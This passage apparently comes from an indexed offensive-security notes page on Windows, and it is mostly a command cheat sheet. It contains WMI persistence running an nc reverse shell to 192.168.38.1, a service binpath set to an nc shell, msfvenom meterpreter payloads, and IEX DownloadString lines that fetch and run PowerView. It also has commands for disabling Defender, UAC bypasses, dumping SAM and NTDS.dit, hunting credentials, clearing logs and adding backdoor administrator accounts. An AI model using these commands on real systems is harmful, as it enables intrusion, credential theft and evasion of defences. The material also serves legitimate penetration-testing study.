; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript . Shell \\ )\\n objShell.Run \\ C : \\\\ Windows \\\\ system32 \\\\ cmd . exe / C C : \\\\ nc . exe 192 . 168 . 38 . 1 1337 -e C : \\\\ Windows \\\\ system32 \\\\ cmd . exe \\ \\n ; }; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; }; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [key] string Name ; }; instance of __EventFilter as $FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass \\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { // ... }; instance of __FilterToConsumerBinding { // ... }; instance of WoootClass { Name = Woot ; }; Usages - Automatically kill some processes as soon as they are launched (anti-rootkits...), - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), - Automatically infect USB devices Exploring Exploring Namespaces Get-WmiObject -Namespace root -Class __Namespace | select name Get-CimInstance -Namespace root -Class __Namespace To read nested namespaces: Get-WmiNamespace Exploring Classes - Namespace root \\ cimv2 is the default of Powershell Get-WmiObject -Class * bios * -List Get-CimClasses -List List only dynamic classes: Get-CimClasses -QualifierName dynamic -List Look at details of the class: Get-WmiObject -Class Win32_Bios | fl * Get-CimInstance -ClassName Win32_Bios | fl * Using WMI Class Get-WmiObject -Class Win32_Process | Where-Object { $_ . Name -eq explorer.exe } Get-WmiObject -Class Win32_Process | where name -eq explorer.exe Get-WmiObject -Query Select * from Win32_Process where Name = explorer.exe Get-CimInstance -ClassName Win32_Process -Filter Name -eq explorer.exe Get-CimInstance -Query Select * from Win32_Process where Name = explorer.exe Can use Remove - WmiObject and Remove - CimInstance to close processed, remove registry entries, etc. Methods Identifying methods: Get-WmiObject * -List | Where-Object { $_ . Method } ( Get-WmiObject -Class Win32_Process -List ). Methods Get-CimClass -Class Win32_Process -List | Select -ExpandProperty Methods Get-CimClass -MethodName * Get-CimClass -MethodName * create * Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods Exploring methods: Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods | where name -eq Create | Select -ExpandProperty Parameters Invoke: Invoke-WmiMethod -Class Win32_process -Name create -ArgumentList calc . exe Invoke-CimMethod -ClassName Win32_process -MethodName Create -Arguments @{ CommandLine = calc.exe } Update Instance Get-WritableProperties Get-WmiObject -Class Win32_Printer -FIlter name = Microsoft XPS Document Writer | Set-WmiInstance -Arguments @{ Comment = Example comment } Get-CimInstancet -ClassName Win32_Printer -FIlter name = Microsoft XPS Document Writer | Set-CimInstance -Property @{ Comment = Example comment } Associations https://github.com/dfinke/images/blob/master/acn.png Get-WmiObject -Class * Win32_NetworkAdapter * -List | fl * Get-WmiObject -Class Win32_NetworkAdapter -List | fl * Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get-CimAssociatedInstance -InputObject ( Get-CimInstance -ClassName Win32_NetworkAdapter -Filter DeviceId = 11 ) Only see one association class: Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} -AssociationClass Win32_ProtocolBinding Get references (classes linking two other classes) Get-WimObject -Query References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get-WimObject -Query References of {win32_NetworkAdapter.DeviceID=11} Interesting Queries List all the systems within the current environment/directory: SELECT ds_cn FROM ds_computer Installed software: File listing: Services: Logon accounts: Hardware information: Installed patches: Security logs: Command line used to start processes: Path to executable for running processes: Useful WMI Classes Win32_OperatingSystem Win32_Process Win32_IP4RouteTable Win32_UserAccount Win32_Groups Win32_ShadowCopy Create a shadow copy of AD's drive and extract NTDS.dit ( Get - WmiObject - Class Win32_ShadowCopy - list ). create ( C:\\ , CreateAccessible ) $ link = ( Get - WmiObject - Class Winn32_ShadowCopy ). DeviceObject + \\ cmd / c mklink / d C : \\ shadowcopy $link AD Tools WMI Object Browser: WMIC # WMIC Verbs can be explored by looking at help # Interactive wmic wmic : root \\ cli process /? wmic : root \\ cli group where name = Administrators assoc # Non-interactive wmic process /? Powershell WMI Browser WMI Code Generator WMIGen Remoting WMI Cmdlets Uses DCOM Port 135 (winmgmt service) Not firewall / NAT friendly Data exchanged on dynamic ports ( HKLM \\ Software \\ Microsoft \\ Rpc \\ Internet ) CIM Cmdlets DCOM 135 WinRm/WSMan 5385 - HTTP 5386 - HTTPS Firewall and NAT friendly Session over WinRM/WSMan: $sess = New-CimSession -ComputerName name -Credential cred Get-CimInstance -CimSession $sess -ClassName Win32_OperatingSystem Session over DCOM: $sessOptions = New-CimSessionOption -Protocol Dcom $newsess = New-CimSession -ComputerName name -Credential cred -SessionOption $sessOptions Access Registry Get-WimObject -Namespace root \\ default -Class StdRegProv -List Get-WimObject -Namespace root \\ default -Class StdRegProv -List | Select-Object -ExpandProperty methods | more $RegProv = Get-WimObject -Namespace root \\ default -Class StdRegProv -List $RegProv . Methods $RemoteReg = Get-WmiObject -List StdRegProv -ComputerName name -Credential cred $RemoteReg | Select-Object -ExpandProperty methods | more $RemoteReg . getStringValue ( id , path , propertyName ) WmiInvokeMethod -Namespace root \\ default -Class StdRegProv -Name GetStringValue @( id , path , property ) Posh_SecMod \\ Registry . ps1 References Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows AppLocker https://github.com/api0cradle/UltimateAppLockerByPassList HyperV Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd Events Tools EtwExplorer - View Event Tracing for Windows (ETW) Provider manifests: https://github.com/zodiacon/EtwExplorer Defense Disable Windows Defender: Set - MpPreference - DisableRealtimeMonitoring $ true Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/ Server Security https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance References Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/ Kernel Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849 Troubleshooting RELI: Reliability History/Monitor Problem Steps Recorder (PSR): troubleshooting, assistance, screen capture, annotation tool PathPing: Details of the path between two hosts and the echo-location statistics for each node are displayed. tracert to the destination ICMP to ping each hop 100 times My TraceRoute (MTR): identify issues between two routers responsible for overall latency Sysinternals: Process Explorer PsExec PsList PsKill PsLoggedOn Notmyfault: crash or handle kernel memory leaks Autoruns SDelete Windows Master Control Panel: gives you access to all the operating systems control panels within one folder. Right-click your Windows 7, 8.1, or 10 desktop and choose New \u27aa Folder. Name the folder GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}. Random WINDOWS COMMANDS BASIC systeminfo hostname whoami whoami /all echo %username% ipconfig /all route print netstat -ntlp -listening ports netstat -bano netsat -r -routing table command | findstr /C: str -grep echo %userdomain% echo %path% shutdown /r start explorer -execute path builtin program (same as input to win+r) env set path -print currently defined execution path setx c:\\Program Files(x86)\\bin\\ -append target directory to currently defined execution path runas /profile /user:administrator C:\\absolute\\path\\pcoff.exe -run target executable with user profile permissiosn for /user: --*should prompt for target user s password START /B process.exe run code excution in background for %% i in ( C:\\abs\\path\\* ) do %% i OR for /F usebackq %i in ( `dir /b C:\\macros\\Day\\` ) DO %i -execute all files in a directory Auto-Start Directories Windows NT 6.1,6.0 %SystemDrive% \\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ Windows NT 5.2, 5.1, 5,0 %SystemDrive% \\Documents And Settings\\All Users\\Start Menu\\Programs\\StartUp\\ Windows 9x %SystemDrive% \\wmiOWS\\Start Menu\\Programs\\StartUp\\ Windows NT 4.0, 3.51, 3.50 %SystemDrive% \\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\StartUp\\ FILESYSTEM type file -print file dir /s *pass* == *cred* == *vnc* == *.config* dir \\ /s /b | find /I \u201csearchstring\u201d findstr /si password *.xml *.ini *.txt fsutil fsinfo drives -list drives currently on the system --requires admin privs assoc -print returned list of file extension associations assoc .ps1=powershellfile ftype powershellfile= %SystemRoot% \\system32\\WindowsPowerShell\\v1.0\\powershell.exe -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with dir /a-r-d /s /b -check directory for writeable files powershell Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern everyone -check for world-writeable files File Transfer iexplore.exe http://blah.com/filename.zip C : \\windows\\explorer.exe http://somewhere.com/filename.ext ftp ftp.site.dom USERS whoami net users net user /domain -list users in current domain net user username -list user info net user name pass /add -add local system user net user user_name * /domain -add user to domain with interactive prompt for password net user name setpword net user /DOMAIN %USERNAME% -check user s network group membership net user /domain user -check another user s information net group Domain Users /domain -list users in AD group net localgroup administrators /domain -list domain local group users net group \u201cDomain Admins\u201d /domain net group \u201cEnterprise Admins\u201d /domain net group \u201cDomain Controllers\u201d /domain NET LOCALGROUP Remote Desktop Users trinity /ADD net accounts -prints password policy for locahost net accounts /domain dsmod user /? -get dsmod commands cruft dsmod user administrator -pwd NewPassword -mustchpwd yes -modify user password, set pwExpired flag NETWORK arp -A net view -view available network share hosts net view \\\\HOST -view available shares on host net view /domain:otherdomain Queries NBNS/SMB (SAMBA) and tries to find all hosts in \u2018otherdomain\u2019 tasklist /V /S computername qwinsta /SERVER:computername qprocess /SERVER:computername * net use \\\\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed dir \\\\computername\\share_or_admin_share\\ net use \\\\computer\\share -mount an smb share net use X: \\\\10.2.2.224\\C$ net use * http//hostname/nfs/ pword /USER:username net share name=c:\\path\\to\\share -create smb share net share name=c:\\path\\to\\share /GRANT:Everyone,FULL -make an smb share world-accessable pushd \\\\10.2.2.224\\C$ -mount remote file share to automatically mapped drive cacls c:\\path\\ /T /E /G user:f -grant user full file access control from path tasklist /V /S computername Lists tasks w/users running those tasks on a remote system netsh firewall show state netsh firewall show config netsh firewall set opmode disable netsh advfirewall firewall set rule group= windows management instrumentation (wmi) new enable=yes -enable remote wmi netsh interface ip set address local dhcp -configure nic to user dhcp netsh advfirewall firewall add rule name= Open Port 3389 dir=in action=allow protocol=TCP localport=3389 -open port (for rdesktop) netsh advfirewall firewall add rule name= Block mssql attack ips dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213 -close port (for rdesktop) netsh advfirewall set allprofiles state off netsh wlan show profiles -shows all saved wireless profiles netsh wlan export profile folder=. key=clear exports a user wifi profile with the password in plaintext to an xml file in the current working directory netsh wlan [start | stop] hostednetwork Starts or stops a wireless backdoor on a windows 7 pc netsh wlan set hostednetwork ssid= ssid key= passphrase keyUsage=persistent | temporary Complete hosted network setup for creating a wireless backdoor on win 7 netsh wlan set hostednetwork mode=[allow | disallow] netdom query trust /Domain:dnsname OR nltest /domain_trusts /All_Trusts SERVICES/PROCESSES/PERMISSIONS configuration tasklist tasklist /SVC taskkill pid net start -list all running services sc [stop | start ] service sc qc service -view configuration of a service - sc config upnphost binpath= C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe - sc config upnphost obj= .\\LocalSystem password= - net start upnphost sc query sc queryex schtasks /query /fo LIST /v net start RpcSs net stop RpcSs -start stop rpc service on localhost c : \\windows\\system32\\gathernetworkinfo.vbs ( Windows 7 ) Included script with, enumerates builtin config information pkgmgr /iu: TelnetServer pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel ( On Vista ) install update or uninstall update builtin process icacls dir\\ -check the file permissions of a folder WMIC WINDOWS MANAGEMENT INSTRUMENTATION **default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/ http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/ QUERIES SELECT [Class property name | *] FROM [CLASS NAME] WHERE [CONSTRAINT] SELECT * FROM Win32_Process WHERE Name LIKE \u201c %chrome% \u201d -wmic instance query INFORMATION wmic /? WMIC enable (remote) wmic startupwmic service -start remote wmi service netsh firewall set service RemoteAdmin enable netsh advfirewall firewall set rule group= windows management instrumentation (wmi) new enable=yes -make exception in firewall for remote wmic service HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM\\CIMOM\\AllowAnonymousCallback Get-WmiObject -Namespace root\\cimv2 -Class Win32_LogicalDisk -ComputerName REMOTE_IP -Credential DOMAIN\\User -test remote wmi access ENUMERATION wmic qfe -patch level information wmic qfe get -list patching information for localhost wmic qfe qfe hotfixid wmic qfe get Caption,Description,HotFixID,InstalledOn\\ -get windows patch level information wmic process list full -list all attributes of all running processes wmic process get caption,executablepath,commandline wmic process call create \u201cprogram\u201d wmic process where name=\u201cprogram\u201d call terminate -kill target program wmic process get caption,executablepath,commandline /format:csv wmic useraccount wmic useraccount get /ALL wmic useraccount where name= uname get sid wmic useraccount where sid= S-1-3-12-1234525106-3567804255-30012867-1437 get name wmic useraccount where (name= administrator and domain= %computername% ) get name,sid -get name/sid for system admin wmic useraccount where (name= administrator and domain= %userdomain% ) get name,sid -get name/sid for domain admin wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v -check for trusted service paths(privesc) wmic get /ALL /format:csv wmic share get /ALL -list smb shares wmic logicaldisk get name wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber wmic start list full -list startup programs wmic computersystem get domain wmic ntdomain list -domain and DC info PRIVESC enumeration wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v -find unquote service path REGISTRY *note HKLM keys are for HKey local machine registry *HKCU keys are for HKey current user registry entries reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated -together allow users of any privilege level to install *.msi files as NT AUTHORITY\\SYSTEM reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f -enable RDP reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s -grep the registry for key word password REG add HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs /v Start /t REG_DWORD /d 2 /f -change startup type for rpc service to automatic REG add HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs /v Start /t REG_DWORD /d 4 /f -change startup type for rpc service to disabled reg add HKEY_LOCAL_MACHINE\\SYSTEM\\Current ControlSet\\Control\\Terminal Server /v fAllowToGetHelp /t REG_DWORD /d 1 /f reg query HKLM /s /d /f C:\\* *.exe | find /I C:\\ | find /V -(win7) curely registered executables within the system registry reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon -windows autologin reg query HKCU\\Software\\ORL\\WinVNC3\\Password -vnc stored password reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions -putty cleartext credentials reg save HKLM\\Security security.hive --save security.hive reg save HKLM\\System system.hive --save system hive to file reg save HKLM\\SAM sam.hive --save sam to file reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d cmd.exe /f START /W CompMgmtLauncher.exe reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f -UAC bypass for win 7/8/10 reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /d cmd.exe /f START /W sdclt.exe reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /f -UAC bypass for win 10 START Administrative Tools Server Manager Features Add Features Administrative Tools Windows Powershell -enable powershell on machine POWERSHELL syntax (from cmd.exe, where installed): Special Characters The beginning (or end) of quoted text # The beginning of a comment $ The beginning of a variable Reserved for future use ( ) Parentheses used for subexpressions ; Statement separator { } Script block | Pipeline separator ` Escape character .\\Powershell.exe -command command parameter(s) attrib +R c:\\path\\to\\file.txt $var = hello Powershell.exe -command Get-HotFix -check Windows patch level Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-NetUser -display all AD users Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-UserProperties -Properties name,memberof,description,info -return AD user proprietary information set-ItemProperty -Path HKLM:\\System\\Current\\ControlSet\\Control\\Terminal Server -name fDenyTSConnections -Value 0 -format for making registry queries from powershell --enable RDP on target hostname Enable-NetFirewallRule -DisplayGroup Remote Desktop -enable existing firewall rule, e.g. RDP allow powershell.exe -command New-NetFirewallRule -DisplayName Allow Inbound Port 80 -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow -create new firewall rule set to allow --to create a block rule set -Action Block powershell.exe -command Get-Service -show all services powershell.exe -command Restart-Service -restart target service powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias Ethernet -ServerAddresses 8.8.8.8 -Configure the DNS Server (to 8.8.8.8/Google) powershell.exe -command Get-Process -return a process listing Start-Job { C:\\bin\\hashcat\\bin\\hashcat64.exe } -Name cracker bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\\Path\\to\\outfile.ext -download a file ACTIVE DIRECTORY cmdlets Get-Job -State Stop-Job cracker Get-Command *text* Get-Command -Verb Get Get-Command -Noun Service Get-Help Get-Command (-Detailed,-Full,-Examples,-Online) OR Get-Command -? Get-SmbServerConfiguration Set-SmbServerConfiguration -EnableSMB1Protocol $true Get-ChildItem -Path C:\\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-NetComputers -return listing of hosts in Active Directory Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-Information -return information collected on sys,reg, c Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Invoke-Userhunter -search network for hosts in use by Domain Admin(s) Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Invoke-Userhunter -UserName admin -search network for host user admin is on get-aduser -filter {name -like krbtgt* } -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1 -get information for krbtgt active directory domain account Get-ADForest | Select Domains -enum domains in an AD forest Get-ADDomain | FL NetBIOSName -get netbios name of an AD domain Get-ADTrust -filter * Powershell x WMIC wmic.exe Powershell WMI cmdlets -- Get-WmiObject -- Get-CimAssociatedInstance -- Get-CimClass -- Get-CimInstance -- Get-CimSession -- Set-WmiInstance -- Set-CimInstance -- Invoke-WmiMethod -- Invoke-CimMethod -- New-CimInstance -- New-CimSession -- New-CimSessionOption -- Register-CimIndicationEvent -- Register-WmiEvent -- Remove-CimInstance -- Remove-WmiObject -- Remove-CimSession Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential \u2018WIN-B85AAA7ST4U\\Administrator Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct -av detection SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory 2147483648 SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors 2 SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE \u201c %VMware% \u201d SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE \u201c %VMware% \u201d SELECT * FROM Win32_Process WHERE Name=\u201dvmtoolsd.exe\u201d SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE \u201c %VMware% \u201d -vm detection Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \u2018notepad.exe\u2019 -code execution, like psexec but stealthier SYSINTERNALS PSEXEC psexec /? psexec -accepteula psexec \\\\machinename reg add hklm\\system\\currentcontrolset\\control\\terminal server /f /v fDenyTSConnections /t REG_DWORD /d 0 psexec \\\\10.2.2.23 netsh firewall set service remoteadmin enable psexec \\\\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable CLEANUP wevtutil el -list logs wevtutil cl log.log -clear specific lowbadming del %WINFRT% \\*.log /a /s /q /f ADVANCED DRIVERQUERY LOCAL EXPLOITS KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799) -patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008 KB2503665: patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp1/2, server 2008 sp1/2, 7 (sp0/1) Table of patch replacements: # | MS11-046 | MS11-080 | MS12-009 | MS13-093 | MS14-040 | # ------------------------------------------------------------- # | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 | # ----------------------------------------------------------------------------------------- # Windows x86 XP SP3 | Installed | -Replaces | - | - | - | # Windows x86 Server 2003 SP2 | Installed | -Replaces | -Replaces | - | -Replaces | # Windows x86 Vista SP1 | Installed | - | - | - | - | # Windows x86 Vista SP2 | Installed | - | - | - | -Replaces | # Windows x86 Server 2008 | Installed | - | - | - | - | # Windows x86 Server 2008 SP2 | Installed | - | - | - | -Replaces | # Windows x86 7 | Installed | - | - | - | - | # Windows x86 7 SP1 | Installed | - | - | - | -Replaces | Policy files (may contain passwords) SYSVOL/(../)Groups.xml Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes Configuration files commonly left behind by mass rollouts/older (pre-)devops c : \\sysprep.inf c : \\sysprep\\sysprep.xml %WINDIR% \\Panther\\Unattend\\Unattended.xml %WINDIR% \\Panther\\Unattended.xml Trusted Service Paths exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v icacls C:\\Program Files (x86)\\Target msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe -now replace Target\\target.exe with payload sc stop target sc start target -now the reverse shell should be spawned as privileged user Vulnerable Services exploit/windows/local/service_permissions accesschk.exe -uwcqv Authenticated Users * /accepteula sc qc target sc config target binpath= net user hacker P@ssword123! /add sc stop target sc start target sc config target binpath= net localgroup Administrators hacker /add sc stop target sc start target -errors may occur starting service, but only after commands are executed AlwaysInstallElevated exploit/windows/local/always_install_elevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi msiexec /quiet /qn /i C:\\Users\\User\\Downloads\\exploit.msi DLL Injection msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe WIN filesystem read targets tier 1 %SYSTEMDRIVE% \\boot.ini near ubiquitous, confirmation that a read is happening %WINDIR% \\win.ini second test file if boot.ini cannot be found/returned %SYSTEMROOT% \\repair\\SAM %SYSTEMROOT% \\System32\\config\\RegBack\\SAM stores users passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \\repair is locked, but can be retired using forensic or Volume Shadow copy methods %SYSTEMROOT% \\repair\\system %SYSTEMROOT% \\System32\\config\\RegBack\\system key to read SAM hashes in plaintext without cracking %WINDIR% \\repair\\security %SYSTEMDRIVE% \\autoexec.bat TIER 1, LOCATION NOT SET BY DEFAULT unattend.txt unattend.xml sysprep.inf --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location. tier 2 %WINDIR% \\debug\\NetSetup.log %WINDIR% \\repair\\software %WINDIR% \\iis6.log ( or 5 or 7, given version ) %WINDIR% \\system32\\logfiles\\httperr\\httperr1.log --iis6 error log %SystemDrive% \\inetpub\\logs\\LogFiles --IIS 7\u2019s logs location %WINDIR% \\system32\\config\\AppEvent.Evt %WINDIR% \\system32\\config\\SecEvent.Evt %WINDIR% \\system32\\config\\default.sav %WINDIR% \\system32\\config\\security.sav %WINDIR% \\system32\\config\\software.sav %WINDIR% \\system32\\config\\system.sav %WINDIR% \\system32\\CCM\\logs\\*.log %USERPROFILE% \\ntuser.dat %USERPROFILE% \\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR% \\System32\\drivers\\etc\\hosts references http://www.fuzzysecurity.com/tutorials/16.html https://www.toshellandback.com/2015/11/24/ms-priv-esc/ https://pastebin.com/FehvXsEZ https://pastebin.com/HvKs18zh","title":"Windows"},{"location":"windows/windows/#quick-references","text":"Commands prevesc: https://guif.re/windowseop VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ Versions Windows 1 . 0 1 . 04 Windows 2 . 0 2 . 11 Windows 3 . 0 3 Windows NT 3 . 1 3 . 10 . 528 Windows for Workgroups 3 . 11 3 . 11 Windows NT Workstation 3 . 5 3 . 5 . 807 Windows NT Workstation 3 . 51 3 . 51 . 1057 Windows 95 4 . 0 . 950 Windows NT Workstation 4 . 0 4 . 0 . 1381 Windows 98 4 . 1 . 1998 Windows 98 Second Edition 4 . 1 . 2222 Windows Me 4 . 90 . 3000 Windows 2000 Professional 5 . 0 . 2195 Windows XP 5 . 1 . 2600 Windows Vista 6 . 0 . 6000 Windows 7 6 . 1 . 7600 Windows 8 . 1 6 . 3 . 9600 Windows 10 10 . 0 . 10240 User Accounts LocalSystem account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx Very high-privileged built-in account. Extensive privileges on the local system and acts as the computer on the network. The actual name of the account is NT AUTHORITY \\ SYSTEM . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY \\ SYSTEM and BUILTIN \\ Administrators SIDs; these accounts have access to most system objects. The name of the account in all locales is . \\ LocalSystem . The name, LocalSystem or ComputerName \\ LocalSystem can also be used. This account does not have a password. If you specify the LocalSystem account in a call to the CreateService or ChangeServiceConfig function, any password information you provide is ignored. The service can open the registry key HKEY_LOCAL_MACHINE\\SECURITY. The service presents the computer's credentials to remote servers. If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions. A service that runs in the context of the LocalSystem account inherits the security context of the SCM. The user SID is created from the SECURITY_LOCAL_SYSTEM_RID value. Has: E_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (enabled) SE_BACKUP_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_CREATE_PAGEFILE_NAME (enabled) SE_CREATE_PERMANENT_NAME (enabled) SE_CREATE_TOKEN_NAME (disabled) SE_DEBUG_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INC_BASE_PRIORITY_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_LOAD_DRIVER_NAME 